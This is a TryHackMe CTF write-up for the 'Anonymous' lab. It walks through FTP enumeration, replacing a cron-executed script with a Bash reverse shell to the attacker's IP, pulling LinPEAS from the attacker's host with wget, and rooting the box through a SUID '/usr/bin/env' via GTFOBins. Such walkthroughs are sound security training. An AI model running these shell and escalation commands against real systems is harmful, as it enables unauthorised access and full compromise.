# TryHackMe: Anonymous Write-Up

## Overview

This write-up documents my approach to completing the **Anonymous** room on TryHackMe. The room focuses on service enumeration, FTP misconfigurations, Linux privilege escalation, and post-exploitation techniques.

Through systematic enumeration, I identified a writable script being executed automatically by a scheduled task, which allowed me to gain initial access. Further investigation revealed a vulnerable SUID binary that led to root privileges.

---

## Room Information

| Category | Details |
|-----------|----------|
| Platform | TryHackMe |
| Room | Anonymous |
| Difficulty | Easy |
| Operating System | Linux |

---

## Skills Practiced

- Network Enumeration
- FTP Enumeration
- SMB Enumeration
- Linux Privilege Escalation
- Cron Job Abuse
- Reverse Shell Techniques
- SUID Exploitation
- GTFOBins Usage

---

## Attack Path Summary

### 1. Enumeration

- Performed an Nmap scan to identify open services.
- Discovered FTP, SSH, and SMB services.
- Identified anonymous FTP access.

### 2. FTP Analysis

- Logged into the FTP server using anonymous credentials.
- Located a `scripts` directory containing:
  - `clean.sh`
  - `removed_files.log`
  - `to_do.txt`
- Downloaded files for local analysis.

### 3. Initial Access

- Found that `clean.sh` was world-writable.
- Observed log updates occurring every minute.
- Determined the script was executed by a scheduled cron job.
- Replaced the script with a reverse shell payload.
- Received a shell as the user **namelessone**.

### 4. Privilege Escalation

- Transferred and executed LinPEAS.
- Identified `/usr/bin/env` with the SUID bit set.
- Referenced GTFOBins for exploitation techniques.
- Spawned a root shell using the vulnerable binary.

### 5. Root Access

- Successfully escalated privileges to root.
- Retrieved the root flag and completed the room.

---

## Key Findings

| Finding | Impact |
|----------|---------|
| Anonymous FTP Access | Information Disclosure |
| Writable Cleanup Script | Remote Code Execution |
| Cron Job Execution | Privilege Abuse |
| Misconfigured SUID Binary | Privilege Escalation |

---

## Tools Used

- Nmap
- FTP Client
- SMBClient
- Netcat
- LinPEAS
- GTFOBins

---



## Conclusion

The Anonymous room is an excellent beginner-friendly Linux challenge that demonstrates how small misconfigurations can lead to full system compromise. The combination of FTP enumeration, cron job abuse, and SUID exploitation provides valuable hands-on experience with real-world attack paths.


---
steps are given below:
---


TryHackMe: Anonymous - Write-Up
----------------------------------

A chronological walkthrough of the Anonymous lab on TryHackMe. This report documents the exact steps taken to enumerate the network, compromise the target via an automated cleanup script, and escalate privileges to root using a misconfigured SUID binary via GTFOBins.

Lab Details
Room:[Anonymous](https://tryhackme.com/room/anonymous)
Difficulty: Easy
Machine IP: <TARGET_IP>

-------------------------------------------------

Step-by-Step Walkthrough

Step 1: Initial Network Enumeration
The initial phase involved scanning the host to discover running services and map our attack vectors. 

------------------------------------------------------------------------------
nmap -sC -sV -p- -oN nmap_scan.txt <TARGET_IP>
------------------------------------------------------------------------------

Our scan results highlighted:

Port 21 (FTP):Allowing anonymous access.
Ports 139/445 (SMB): Exposing public shares.

Step 2: Connecting to the FTP Server

Network enumeration revealed an open FTP service on Port 21 configured with weak access controls, allowing anonymous login. Logging in with the username 'anonymous' and a blank password granted access to the file system:

------------------------------------------------------------------------------
$ ftp <TARGET_IP>
Connected to <TARGET_IP>
Name: anonymous
331 Please specify the password.
Password:
230 Login successful.

------------------------------------------------------------------------------




Step 3: Investigating the FTP Directory Listing

Inside the FTP prompt, exploring the 'scripts' directory revealed three files: clean.sh, removed_files.log, and to_do.txt.

------------------------------------------------------------------------------
ftp> ls
229 Entering Extended Passive Mode (|||27938|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1204 Jun 03 04:49 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
------------------------------------------------------------------------------




Attempting to view the script via 'cat clean.sh' directly in FTP returned an '?Invalid command.' error, as the native FTP client requires files to be transferred locally before viewing.

Step 4: Downloading and Analyzing the Script Locally

The files were transferred back to the Kali host using the 'get' command:

------------------------------------------------------------------------------
ftp> get clean.sh
ftp> get removed_files.log
ftp> get to_do.txt
------------------------------------------------------------------------------

Inspecting the downloaded 'clean.sh' binary locally using 'cat' revealed the source code of a routine cleanup process:

------------------------------------------------------------------------------
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

------------------------------------------------------------------------------

### Step 5: Identifying the Cron Job & Gaining a Foothold

By monitoring the FTP timestamps, 'removed_files.log' was observed modifying itself consistently every minute. This behavior explicitly confirmed that a background 'Cron Job' was executing 'clean.sh' on an automated schedule.

Because 'clean.sh' possessed world-writable privileges (-rwxr-xrwx), the file on the local machine was altered to include a standard Bash reverse shell payload:

------------------------------------------------------------------------------
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<YOUR_THM_VPN_IP>/4444 0>&1' > clean.sh
------------------------------------------------------------------------------

A Netcat listener was opened concurrently on the attack host:

------------------------------------------------------------------------------
nc -lvnp 4444
------------------------------------------------------------------------------



The weaponized script was uploaded back to the victim server using 'put clean.sh', successfully overwriting the original file. When the minute mark cycled, the cron job executed the updated file and returned a reverse shell connection:

------------------------------------------------------------------------------
namelessone@anonymous:~$ whoami
namelessone

------------------------------------------------------------------------------

The user flag was successfully captured out of the home directory from '/home/namelessone/user.txt'.

### Step 6: Network Share Discovery Check

During systemic checks on the target filesystem, a non-hidden directory named 'pics' was discovered within the user's home partition:

------------------------------------------------------------------------------
drwxr-xr-x 2 namelessone namelessone 4096 May 17  2020 pics

------------------------------------------------------------------------------

Inside this folder sat 'corgo2.jpg' and 'puppos.jpeg'. This directory correlated directly with the open Samba network share enumerated on Port 445 (//<TARGET_IP>/pics) from the outside, which allowed public, unauthenticated reading.

*(Note: These images were manually analyzed for hidden data using steganography tools, but nothing was found, confirming it was an environmental distraction).*

### Step 7: Transferring LinPEAS via Python

To look for privilege escalation vectors, the 'linpeas.sh' binary was hosted on the attack machine using an HTTP server module:

------------------------------------------------------------------------------
python3 -m http.server 8000
------------------------------------------------------------------------------

From the victim's active reverse shell terminal, the tool was pulled directly down into the writable '/tmp' directory, given execution privileges, and run:

------------------------------------------------------------------------------
cd /tmp
wget http://<YOUR_KALI_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
------------------------------------------------------------------------------

### Step 8: Privilege Escalation to Root via GTFOBins

The resulting LinPEAS log outputs flagged an unusual binary with the SUID bit actively assigned:

------------------------------------------------------------------------------
-rwsr-xr-x 1 root root 35K Jan 18  2018 /usr/bin/env

------------------------------------------------------------------------------

While other SUID executables populated on the list (such as 'gpasswd' and 'newuidmap') are securely restricted by code structures to single target modifications, '/usr/bin/env' runs arbitrary input commands directly.

Cross-referencing **GTFOBins** provided the precise vector to exploit SUID permissions on 'env'. Spawning a shell while preserving structural root execution permissions was accomplished via:

------------------------------------------------------------------------------
/usr/bin/env /bin/sh -p

------------------------------------------------------------------------------

The environment instantly elevated:

------------------------------------------------------------------------------
# whoami
root

------------------------------------------------------------------------------

The walkthrough was completed by retrieving the administrative root flag located within '/root/root.txt'.

Thank you guys...





*Write-up created as part of my cybersecurity learning journey and TryHackMe practice labs.*
